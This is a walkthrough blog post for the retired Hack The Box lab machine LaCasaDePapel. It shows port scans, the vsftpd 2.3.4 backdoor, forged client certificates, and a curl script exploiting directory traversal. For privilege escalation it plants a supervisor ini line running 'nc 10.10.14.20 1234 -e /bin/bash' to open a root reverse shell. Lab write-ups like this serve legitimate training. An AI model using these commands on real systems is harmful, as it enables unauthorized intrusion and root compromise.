---
layout: post
title: "LaCasaDePapel: Hack The Box Walkthrough"
date: 2019-07-27 17:17:04 +0000
last_modified_at: 2019-07-27 17:17:18 +0000
category: Walkthrough
tags: ["Hack The Box", LaCasaDePapel, retired]
comments: true
image:
  feature: lacasadepapel-htb-walkthrough.jpg
  credit: thek / LaCasaDePapel
  creditlink: https://www.hackthebox.eu/home/machines/profile/181
---

This post documents the complete walkthrough of LaCasaDePapel, a retired vulnerable [VM][1] created by [thek][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

LaCasaDePapel is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.131 --rate=500              

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-04-05 07:58:16 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.131
Discovered open port 22/tcp on 10.10.10.131
Discovered open port 443/tcp on 10.10.10.131
Discovered open port 21/tcp on 10.10.10.131
```

`masscan` finds several open ports. Let's do one better with `nmap` scanning the discovered ports to establish the services behind them.

```
# nmap -n -v -Pn -p21,22,80,443 -A --reason -oN nmap.txt 10.10.10.131
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 2.3.4
22/tcp   open   ssh      syn-ack ttl 63 OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:                                                    
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)    
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)   
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp   open  http    syn-ack ttl 63 Node.js Express framework
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: La Casa De Papel
443/tcp  open  https?  syn-ack ttl 63
| http-methods:
|_  Supported Methods: POST OPTIONS
```

What do we have here? vsftpd 2.3.4 has a famous backdoor in `6200/tcp`.

### VSFTPD v2.3.4 Backdoor Command Execution

It's pretty trivial to initiate the backdoor. Any attempts to log in with a username ending with a smiley face `:)` will trigger the backdoor to open. Once that's done, simply `nc 10.10.10.131 6200`.

_Open the backdoor_


{% include image.html image_alt="0719d368.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/0719d368.png" %}


_Connect to the backdoor_


{% include image.html image_alt="f4fef185.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/f4fef185.png" %}


We'll leave the Psy Shell for a while and take a look at the `http` and `https` services.

_`80/tcp`_


{% include image.html image_alt="a11bf985.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/a11bf985.png" %}


_`443/tcp`_


{% include image.html image_alt="42f50941.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/42f50941.png" %}


Looks like I need to generate some kind of client certificate in order to access the `https` service.

### Generating a Client Certificate.

Back in our Psy Shell, check what's in store for us.


{% include image.html image_alt="3439fae5.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/3439fae5.png" %}


Sure, we can generate a client certificate. If only we can find the CA certificate. Wait a tick, it's a two-way SSL right? I can download or export a copy of CA certificate from the site.


{% include image.html image_alt="290070d3.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/290070d3.png" %}


Let's hit that Export button to grab a copy of the so-called CA certificate. Ok, that was easy, what's step two? We generate a certificate signing request (CSR) with `openssl`.

_Generate my own private key_


{% include image.html image_alt="9754161e.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/9754161e.png" %}


_Generate my certificate signing request_


{% include image.html image_alt="1e9b18ea.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/1e9b18ea.png" %}


Awesome. We have all the ingredients ready to cook ourselves a client certificate. Now back to our Psy Shell.

...

We can `base64_decode` our `$caCert` and `$useCsr` in the Psy Shell like so.


{% include image.html image_alt="265b35e1.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/265b35e1.png" %}


Do likewise for our CSR.


{% include image.html image_alt="8690d3ea.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/8690d3ea.png" %}


Repeat the steps listed in the private `sign()` function.

_Grab the CA key_


{% include image.html image_alt="8eefdfdb.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/8eefdfdb.png" %}


_Sign our client certificate_


{% include image.html image_alt="48551577.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/48551577.png" %}


_Export the client certificate_


{% include image.html image_alt="d87fe7a8.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/d87fe7a8.png" %}


Copy the client certificate in the PEM format to my attacking machine and combine with the private key generated earlier to a PCKS#12 certificate format because that's what Firefox accepts.


{% include image.html image_alt="8a336748.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/8a336748.png" %}


Import the client certificate to Firefox.


{% include image.html image_alt="d79d838a.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/d79d838a.png" %}


We can now access the `https` service.


{% include image.html image_alt="a610aabd.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/a610aabd.png" %}


### Directory Traversal Vulnerability

It's not long before I spotted a directory traversal vulnerability with `server.js`. Not only that, I can also download any file as `berlin`.


{% include image.html image_alt="cd1e84f6.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/cd1e84f6.png" %}


Towards that end, I wrote a real simple `bash` script to read any file as `berlin`.

<div class="filename"><span>read.sh</span></div>

```bash
#!/bin/bash

URL=https://lacasadepapel.htb/file
FILE=$(echo -n ../../..$1 | base64 -w0)

curl -s \
     -k \
     --cert-type P12 \
     -E me.p12 \
     $URL/$FILE
```

Here's `user.txt`.


{% include image.html image_alt="13c35673.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/13c35673.png" %}


## Privilege Escalation

During enumeration of `berlin`'s account, I chanced upon the fact that `berlin`'s SSH key pair is available for download.


{% include image.html image_alt="feed4d9a.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/feed4d9a.png" %}


Needless to say, I went ahead to download the key pair. Now, this is where I was stucked for a while. Who would have guessed that `berlin`'s key can log in to `professor`'s SSH account when you have no access to `professor`'s `.ssh/authorized_keys`? Not unless you watch the TV show and know the relationship between Professor and Berlin.

Once you can obtain a shell as `professor`, the rest is easy...

You'll notice the presence of read-only file `memcached.ini` in `professor`'s home directory. Heck, it's `professor`'s turf right? He can remove any file and recreate his own!

```
echo y | rm memcached.ini; echo "[program:memcached]" > memcached.ini; echo "command = sudo /usr/bin/nc 10.10.14.20 1234 -e /bin/bash" >> memcached.ini
```

A minute later, a root shell pops up and the rest is history...


{% include image.html image_alt="84b22297.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/84b22297.png" %}


:dancer:

## Afterthought

It doesn't have to be `memcached.ini`, you know. Any `ini` file will do because of this.


{% include image.html image_alt="97e7d4aa.png" image_src="/3a3c2bb2-c138-4b2b-b4bf-81b283be2d8a/97e7d4aa.png" %}


[1]: https://www.hackthebox.eu/home/machines/profile/181
[2]: https://www.hackthebox.eu/home/users/profile/4615
[3]: https://www.hackthebox.eu/
